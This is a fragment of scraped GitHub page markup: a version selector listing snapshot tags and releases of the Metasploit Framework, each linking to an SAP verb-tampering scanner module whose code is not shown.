                  <a href="/rapid7/metasploit-framework/blob/2013013001/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013013001" rel="nofollow" title="2013013001">2013013001</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2013012301/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013012301" rel="nofollow" title="2013012301">2013012301</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2013011601/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013011601" rel="nofollow" title="2013011601">2013011601</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2013010902/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013010902" rel="nofollow" title="2013010902">2013010902</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2013010901/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013010901" rel="nofollow" title="2013010901">2013010901</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2013010202/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013010202" rel="nofollow" title="2013010202">2013010202</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2013010201/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2013010201" rel="nofollow" title="2013010201">2013010201</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012121903/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012121903" rel="nofollow" title="2012121903">2012121903</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012121902/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012121902" rel="nofollow" title="2012121902">2012121902</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012121901/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012121901" rel="nofollow" title="2012121901">2012121901</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012121201/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012121201" rel="nofollow" title="2012121201">2012121201</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012120701/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012120701" rel="nofollow" title="2012120701">2012120701</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012112801/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012112801" rel="nofollow" title="2012112801">2012112801</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012112101/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012112101" rel="nofollow" title="2012112101">2012112101</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012111402/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012111402" rel="nofollow" title="2012111402">2012111402</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012111401/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012111401" rel="nofollow" title="2012111401">2012111401</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012103101/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012103101" rel="nofollow" title="2012103101">2012103101</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012102401/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012102401" rel="nofollow" title="2012102401">2012102401</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012101702/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012101702" rel="nofollow" title="2012101702">2012101702</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012101701/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012101701" rel="nofollow" title="2012101701">2012101701</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012101002/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012101002" rel="nofollow" title="2012101002">2012101002</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012101001/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012101001" rel="nofollow" title="2012101001">2012101001</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012100301/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012100301" rel="nofollow" title="2012100301">2012100301</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012092601/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012092601" rel="nofollow" title="2012092601">2012092601</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012091901/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012091901" rel="nofollow" title="2012091901">2012091901</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012091202/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012091202" rel="nofollow" title="2012091202">2012091202</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012091201/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012091201" rel="nofollow" title="2012091201">2012091201</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012090501/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012090501" rel="nofollow" title="2012090501">2012090501</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012082901/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012082901" rel="nofollow" title="2012082901">2012082901</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012082202/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012082202" rel="nofollow" title="2012082202">2012082202</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012082201/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012082201" rel="nofollow" title="2012082201">2012082201</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012081601/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012081601" rel="nofollow" title="2012081601">2012081601</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012080801/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012080801" rel="nofollow" title="2012080801">2012080801</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012071701/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012071701" rel="nofollow" title="2012071701">2012071701</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012071101/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012071101" rel="nofollow" title="2012071101">2012071101</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012070401/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012070401" rel="nofollow" title="2012070401">2012070401</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012062702/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012062702" rel="nofollow" title="2012062702">2012062702</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012062701/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012062701" rel="nofollow" title="2012062701">2012062701</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012062001/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012062001" rel="nofollow" title="2012062001">2012062001</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012061301/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012061301" rel="nofollow" title="2012061301">2012061301</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012060603/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012060603" rel="nofollow" title="2012060603">2012060603</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012060601/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012060601" rel="nofollow" title="2012060601">2012060601</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012053002/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012053002" rel="nofollow" title="2012053002">2012053002</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012052303/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012052303" rel="nofollow" title="2012052303">2012052303</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012051603/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012051603" rel="nofollow" title="2012051603">2012051603</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012050901/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012050901" rel="nofollow" title="2012050901">2012050901</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012050201/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012050201" rel="nofollow" title="2012050201">2012050201</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012040401/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012040401" rel="nofollow" title="2012040401">2012040401</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012032801/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012032801" rel="nofollow" title="2012032801">2012032801</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012032101/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012032101" rel="nofollow" title="2012032101">2012032101</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012031401/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012031401" rel="nofollow" title="2012031401">2012031401</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012030701/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012030701" rel="nofollow" title="2012030701">2012030701</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/2012022901/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="2012022901" rel="nofollow" title="2012022901">2012022901</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/4.6.2/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="4.6.2" rel="nofollow" title="4.6.2">4.6.2</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/4.6.1/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="4.6.1" rel="nofollow" title="4.6.1">4.6.1</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/4.6.0-RC2/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="4.6.0-RC2" rel="nofollow" title="4.6.0-RC2">4.6.0-RC2</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/4.6.0-RC1/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="4.6.0-RC1" rel="nofollow" title="4.6.0-RC1">4.6.0-RC1</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/4.6.0/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="4.6.0" rel="nofollow" title="4.6.0">4.6.0</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/4.5.3/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="4.5.3" rel="nofollow" title="4.5.3">4.5.3</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/4.5.2/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="4.5.2" rel="nofollow" title="4.5.2">4.5.2</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/4.5.1/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="4.5.1" rel="nofollow" title="4.5.1">4.5.1</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/4.5.0-RC9/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="4.5.0-RC9" rel="nofollow" title="4.5.0-RC9">4.5.0-RC9</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/4.5.0-RC8/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="4.5.0-RC8" rel="nofollow" title="4.5.0-RC8">4.5.0-RC8</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/4.5.0-RC7/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="4.5.0-RC7" rel="nofollow" title="4.5.0-RC7">4.5.0-RC7</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/4.5.0-RC6/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="4.5.0-RC6" rel="nofollow" title="4.5.0-RC6">4.5.0-RC6</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/4.5.0-RC5/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="4.5.0-RC5" rel="nofollow" title="4.5.0-RC5">4.5.0-RC5</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/4.5.0-RC4/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="4.5.0-RC4" rel="nofollow" title="4.5.0-RC4">4.5.0-RC4</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/4.5.0-RC3/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="4.5.0-RC3" rel="nofollow" title="4.5.0-RC3">4.5.0-RC3</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/4.5.0/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="4.5.0" rel="nofollow" title="4.5.0">4.5.0</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/4.4.0/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="4.4.0" rel="nofollow" title="4.4.0">4.4.0</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/4.3.0/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="4.3.0" rel="nofollow" title="4.3.0">4.3.0</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/4.2-stable/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="4.2-stable" rel="nofollow" title="4.2-stable">4.2-stable</a>
                </div> <!-- /.select-menu-item -->
                <div class="select-menu-item js-navigation-item ">
                  <span class="select-menu-item-icon octicon octicon-check"></span>
                  <a href="/rapid7/metasploit-framework/blob/4.2.0/modules/auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt.rb" class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target" data-name="4.2.0" rel="nofollow" title="4.2.0">4.2.0</a>
                </div> <!-- /.select-menu-item -->
            </div>

            <div class="select-menu-no-results">Nothing to show</div>

          </div> <!-- /.select-menu-list -->

        </div> <!-- /.select-menu-modal -->
      </div> <!-- /.select-menu-modal-holder -->
    </div> <!-- /.select-menu -->

  </div> <!-- /.scope -->

  <ul class="tabnav-tabs">
    <li><a href="/rapid7/metasploit-framework" class="selected js-selected-navigation-item tabnav-tab" data-selected-links="repo_source /rapid7/metasploit-framework">Files</a></li>
